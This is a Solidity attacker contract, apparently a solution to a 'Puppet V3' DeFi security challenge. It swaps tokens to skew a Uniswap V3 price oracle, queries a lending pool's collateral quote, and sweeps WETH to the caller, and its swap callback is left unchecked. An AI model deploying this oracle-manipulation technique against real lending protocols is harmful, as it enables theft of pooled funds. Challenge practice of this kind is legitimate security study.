//SPDX-License-Identifier:MIT

pragma solidity >0.7.0;

import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "@uniswap/v3-core/contracts/libraries/TickMath.sol";

interface IPuppetV3Pool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(uint256 amount)
        external
        view
        returns (uint256);
}

interface IUniswapV3SwapCallback {
    /// @notice Called to `msg.sender` after executing a swap via IUniswapV3Pool#swap.
    /// @dev In the implementation you must pay the pool tokens owed for the swap.
    /// The caller of this method must be checked to be a UniswapV3Pool deployed by the canonical UniswapV3Factory.
    /// amount0Delta and amount1Delta can both be 0 if no tokens were swapped.
    /// @param amount0Delta The amount of token0 that was sent (negative) or must be received (positive) by the pool by
    /// the end of the swap. If positive, the callback must send that amount of token0 to the pool.
    /// @param amount1Delta The amount of token1 that was sent (negative) or must be received (positive) by the pool by
    /// the end of the swap. If positive, the callback must send that amount of token1 to the pool.
    /// @param data Any data passed through by the caller via the IUniswapV3PoolActions#swap call
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

contract PV3Attacker is IUniswapV3SwapCallback {
    IERC20Minimal public token;
    IUniswapV3Pool public v3pool;
    IPuppetV3Pool public lendingPool;
    IERC20Minimal public weth;
    int56[] public tickCumulatives;

    constructor(
        address _token,
        address _v3pool,
        address _lendingPool,
        address _weth
    ) {
        token = IERC20Minimal(_token);
        v3pool = IUniswapV3Pool(_v3pool);
        lendingPool = IPuppetV3Pool(_lendingPool);
        weth = IERC20Minimal(_weth);
    }

    function callSwap(int256 _amount) public {
        v3pool.swap(
            address(this),
            false,
            _amount,
            TickMath.MAX_SQRT_RATIO - 1,
            ""
        );
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external override {
        uint256 amount1 = uint256(amount1Delta);
        token.transfer(address(v3pool), amount1);
    }

    function getQuoteFromPool(uint256 _amountOut)
        public
        view
        returns (uint256 _amountIn)
    {
        _amountIn = lendingPool.calculateDepositOfWETHRequired(_amountOut);
    }

    function observePool(uint32[] calldata _secondsAgos)
        public
        returns (
            int56[] memory _tickCumulatives,
            uint160[] memory _secondsPerLiquidityCumulativeX128s
        )
    {
        (_tickCumulatives, _secondsPerLiquidityCumulativeX128s) = v3pool
            .observe(_secondsAgos);
        tickCumulatives.push(_tickCumulatives[0]);
        tickCumulatives.push(_tickCumulatives[1]);
    }

    function transferWeth() public {
        uint bal = weth.balanceOf(address(this));
        weth.transfer(msg.sender, bal);
    }
}
